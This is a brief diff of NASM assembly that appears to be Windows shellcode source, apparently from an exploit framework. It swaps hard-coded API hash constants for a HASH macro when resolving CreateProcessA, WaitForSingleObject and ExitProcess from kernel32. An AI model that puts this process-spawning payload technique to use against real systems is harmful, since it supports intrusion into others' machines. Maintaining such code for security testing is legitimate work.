@@ -58,7 +58,7 @@
   LCreateProcessA:
 %if %1 == 1
       push dword [ebp] ; kernel32.dll
-      push 0x16b3fe72  ; CreateProcessA
+      HASH push 'CreateProcessA'
       call [ebp + 4]
       call eax
 %else
@@ -69,7 +69,7 @@
   LWaitForSingleObject:
 %if %1 == 1
       push dword [ebp] ; kernel32.dll
-      push 0xce05d9ad  ; WaitForSingleObject
+      HASH push 'WaitForSingleObject'
       call [ebp + 4]
 %endif
 
@@ -84,7 +84,7 @@
   LDeathBecomesYou:
 %if %1 == 1
       push dword [ebp] ; kernel32.dll
-      push 0x73e2d87e  ; ExitProcess
+      HASH push 'ExitProcess'
       call [ebp + 4]
 %endif
       
